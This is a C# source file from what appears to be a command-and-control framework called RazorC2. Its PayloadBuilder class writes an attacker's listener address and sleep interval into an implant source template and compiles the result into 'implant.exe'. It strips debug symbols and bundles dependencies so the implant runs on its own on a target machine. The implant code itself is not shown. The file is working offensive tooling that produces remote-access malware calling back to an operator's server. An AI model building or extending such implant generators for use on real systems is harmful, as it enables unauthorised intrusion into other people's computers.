using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace RazorC2.PayloadGenerator.Services // Adjust namespace
{
    // Result class - can stay here or be moved to Models folder
    public class PayloadGenerationResult
    {
        public bool Success { get; set; }
        public byte[]? ExeBytes { get; set; }
        public string ErrorMessage { get; set; } = string.Empty;
        public string ProcessOutput { get; set; } = string.Empty;
    }

    public class PayloadBuilder
    {
        private readonly ILogger<PayloadBuilder> _logger;
        private readonly string _templateBasePath; // Path where PayloadTemplates folder is relative to service EXE

        // Constructor - gets path relative to where service is running
        public PayloadBuilder(ILogger<PayloadBuilder> logger)
        {
            _logger = logger;
            // Assume PayloadTemplates is copied next to the service EXE
            _templateBasePath = AppContext.BaseDirectory;
            _logger.LogInformation("PayloadBuilder initialized. Template Base Path: {Path}", _templateBasePath);
        }


        public async Task<PayloadGenerationResult> GenerateExePayloadAsync(string listenerIp, int listenerPort, int defaultSleepSeconds, string targetFramework = "net48")
        {
            _logger.LogInformation("Starting payload generation: Target={TFM}, Listener={IP}:{Port}, Sleep={Sleep}", targetFramework, listenerIp, listenerPort, defaultSleepSeconds);
            var result = new PayloadGenerationResult();
            string tempBuildDir = string.Empty;

            try
            {
                // 1. Prepare Source, Create Temp Dir
                string teamServerUrl = $"http://{listenerIp}:{listenerPort}";
                // Path to template relative to where PayloadBuilder is running
                string templatePath = Path.Combine(_templateBasePath, "PayloadTemplates", "ImplantSource.cs");
                if (!File.Exists(templatePath)) throw new FileNotFoundException("Implant C# source template not found.", templatePath);

                string templateCode = await File.ReadAllTextAsync(templatePath);
                string finalSourceCode = templateCode.Replace("%%TEAM_SERVER_URL%%", teamServerUrl).Replace("__DEFAULT_SLEEP__", defaultSleepSeconds.ToString());

                tempBuildDir = Path.Combine(Path.GetTempPath(), $"RazorC2_Gen_{Guid.NewGuid()}");
                Directory.CreateDirectory(tempBuildDir);
                _logger.LogInformation("Created temporary build directory: {TempDir}", tempBuildDir);

                string sourceFileName = "ImplantSource.cs";
                string sourceFilePath = Path.Combine(tempBuildDir, sourceFileName);
                await File.WriteAllTextAsync(sourceFilePath, finalSourceCode, Encoding.UTF8);


                // 2. Create Temporary .csproj
                string projFileName = "TempImplantProject.csproj";
                string csprojPath = Path.Combine(tempBuildDir, projFileName);
                string csprojContent = GenerateTempProjectFile(sourceFileName, targetFramework); // Pass TFM
                await File.WriteAllTextAsync(csprojPath, csprojContent, Encoding.UTF8);


                // 2.5 Create Fody config if targeting net48 (or relevant framework)
                if (targetFramework.StartsWith("net4") || targetFramework.StartsWith("net3") || targetFramework.StartsWith("net2"))
                {
                    await CreateFodyConfigFile(tempBuildDir);
                }


                // 3. Execute 'dotnet publish'
                _logger.LogInformation("Publishing temporary project (target {TFM})...", targetFramework);
                string publishSubDir = Path.Combine(tempBuildDir, "publish_output");
                var publishResult = await RunDotnetPublishAsync(tempBuildDir, publishSubDir, targetFramework);

                result.ProcessOutput = publishResult.Output + "\n" + publishResult.Errors;
                if (!publishResult.Success) throw new Exception($"dotnet publish failed (Code: {publishResult.ExitCode}). Check logs. Errors: {publishResult.Errors}");

                // 4. Locate EXE
                string exeName = "implant.exe";
                string expectedExePath = Path.Combine(publishSubDir, exeName);
                if (!File.Exists(expectedExePath))
                {
                    string fallbackExePath = Path.Combine(publishSubDir, Path.GetFileNameWithoutExtension(projFileName) + ".exe");
                    if (File.Exists(fallbackExePath)) expectedExePath = fallbackExePath;
                    else throw new FileNotFoundException($"Generated EXE '{exeName}' not found after publish.", expectedExePath);
                }


                // 5. Read EXE bytes
                result.ExeBytes = await File.ReadAllBytesAsync(expectedExePath);
                result.Success = true;
                var fileSize = new FileInfo(expectedExePath).Length;

                if (targetFramework.StartsWith("net4"))
                {
                    result.ErrorMessage = $"Successfully generated net48 payload '{exeName}' ({fileSize:N0} bytes) with embedded dependencies. Requires .NET Framework 4.8 on target.";
                }
                else
                { // Assuming .NET 8 or similar
                    result.ErrorMessage = $"Successfully generated self-contained net8 payload '{exeName}' ({fileSize:N0} bytes).";
                }
                _logger.LogInformation(result.ErrorMessage);

            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error during payload generation.");
                result.Success = false;
                result.ErrorMessage = ex.Message;
            }
            finally
            {
                if (!string.IsNullOrEmpty(tempBuildDir) && Directory.Exists(tempBuildDir))
                {
                    try
                    {
                        Directory.Delete(tempBuildDir, true);
                        _logger.LogInformation("Temporary build directory deleted: {TempDir}", tempBuildDir);
                    }
                    catch (Exception cleanupEx)
                    {
                        _logger.LogError(cleanupEx, "Error during cleanup of temporary build directory: {TempDir}", tempBuildDir);
                    }
                }
            }
            return result;
        }


        // --- Helper Methods (Moved from Program.cs into this class) ---

        private string GenerateTempProjectFile(string sourceFileName, string targetFramework)
        {
            // Determine if self-contained based on TFM (true for net8.0, false for net48)
            bool isSelfContained = !targetFramework.StartsWith("net4");
            bool includeFody = !isSelfContained; // Only include Fody for netfx

            return $@"<Project Sdk=""Microsoft.NET.Sdk"">
              <PropertyGroup>
                <OutputType>Exe</OutputType>
                <TargetFramework>{targetFramework}</TargetFramework>
                {(targetFramework.StartsWith("net4") ? "<LangVersion>7.3</LangVersion>" : "")}
                <ImplicitUsings>{(targetFramework.StartsWith("net4") ? "disable" : "enable")}</ImplicitUsings>
                <Nullable>{(targetFramework.StartsWith("net4") ? "disable" : "enable")}</Nullable>
                <AssemblyName>implant</AssemblyName>
                <DebugType>None</DebugType>
                <DebugSymbols>false</DebugSymbols>
                <EnableDefaultCompileItems>false</EnableDefaultCompileItems>
                <UseWindowsForms>false</UseWindowsForms>
                <UseWPF>false</UseWPF>
                <Optimize>true</Optimize>
                <AppendTargetFrameworkToOutputPath>false</AppendTargetFrameworkToOutputPath>
                <AppendRuntimeIdentifierToOutputPath>false</AppendRuntimeIdentifierToOutputPath>

                <!-- Publish Properties -->
                <SelfContained>{isSelfContained.ToString().ToLowerInvariant()}</SelfContained>
                 {(isSelfContained ? "<PublishSingleFile>true</PublishSingleFile>" : "")}
                 {(isSelfContained ? "<IncludeNativeLibrariesForSelfExtract>true</IncludeNativeLibrariesForSelfExtract>" : "")}

              </PropertyGroup>
              <ItemGroup>
                <Compile Include=""{sourceFileName}"" />
              </ItemGroup>
              <ItemGroup>
                <PackageReference Include=""Newtonsoft.Json"" Version=""13.0.3"" />
                 {(targetFramework.StartsWith("net4") ? @"<Reference Include=""System.Net.Http"" />" : "")}

                {(includeFody ? @"
                <!-- Add Costura.Fody for embedding dependencies -->
                <PackageReference Include=""Costura.Fody"" Version=""6.0.0"" >
                  <PrivateAssets>all</PrivateAssets>
                  <IncludeAssets>runtime; build; native; contentfiles; analyzers; buildtransitive</IncludeAssets>
                </PackageReference>
                <PackageReference Include=""Fody"" Version=""6.8.2"">
                  <PrivateAssets>all</PrivateAssets>
                  <IncludeAssets>runtime; build; native; contentfiles; analyzers; buildtransitive</IncludeAssets>
                </PackageReference>" : "")}
              </ItemGroup>

              {(includeFody ? @"
              <ItemGroup>
                <None Include=""FodyWeavers.xml"" />
              </ItemGroup>" : "")}

            </Project>";
        }

        private async Task CreateFodyConfigFile(string projectDirectory) { /* ... Keep existing ... */ }

        // Make static if not using instance logger/fields directly
        private static async Task<(bool Success, int ExitCode, string ErrorMessage, string Output, string Errors)> RunDotnetPublishAsync(
            string projectDirectory, string outputDirectory, string targetFramework)
        {
            // Decide if RID is needed (mainly for self-contained or specific assets)
            bool requiresRid = !targetFramework.StartsWith("net4"); // Don't use RID for netfx publish command
            string rid = DetermineRuntimeIdentifier();

            var args = new List<string>
            {
                $"publish \"{Path.Combine(projectDirectory, Directory.GetFiles(projectDirectory, "*.csproj").First())}\"",
                $"-c Release",
                $"-f {targetFramework}",
                $"-o \"{outputDirectory}\"",
                 (requiresRid ? $"-r {rid}" : ""), // Add RID only if needed
                 // Properties needed are now mostly in the csproj
                 // "/p:AssemblyName=implant", // Set in csproj
                 // "/p:SelfContained=...", // Set in csproj
                $"/nologo",
                $"-v minimal"
            };

            string arguments = string.Join(" ", args.Where(a => !string.IsNullOrWhiteSpace(a))); // Filter out empty args like RID
            Console.WriteLine($"Executing dotnet publish: dotnet {arguments}"); // Use Console or pass logger

            var processInfo = new ProcessStartInfo("dotnet", arguments)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = projectDirectory
            };

            var process = new Process { StartInfo = processInfo };
            var outputBuilder = new StringBuilder();
            var errorBuilder = new StringBuilder();

            process.OutputDataReceived += (sender, e) => { if (e.Data != null) outputBuilder.AppendLine(e.Data); };
            process.ErrorDataReceived += (sender, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };

            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
            await process.WaitForExitAsync();

            int exitCode = process.ExitCode;
            string output = outputBuilder.ToString();
            string errors = errorBuilder.ToString();

            return (exitCode == 0, exitCode, errors, output, errors);
        }

        private static string DetermineRuntimeIdentifier() // Made static as it doesn't depend on instance state
        {
            string osPart = "";
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) osPart = "win";
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux)) osPart = "linux";
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX)) osPart = "osx";
            else osPart = "unknown"; // Could throw or default differently

            // Get architecture
            string archPart = RuntimeInformation.ProcessArchitecture switch
            {
                Architecture.X64 => "x64",
                Architecture.X86 => "x86",
                Architecture.Arm64 => "arm64",
                Architecture.Arm => "arm",
                _ => "unknown" // Fallback for architectures not explicitly handled
            };

            if (osPart == "unknown" || archPart == "unknown")
            {
                Console.WriteLine($"[WARN] Could not fully determine RID (OS={osPart}, Arch={archPart}). Falling back to win-x64.");
                return "win-x64";
            }

            return $"{osPart}-{archPart}";
        }

    } // End Class PayloadBuilder
}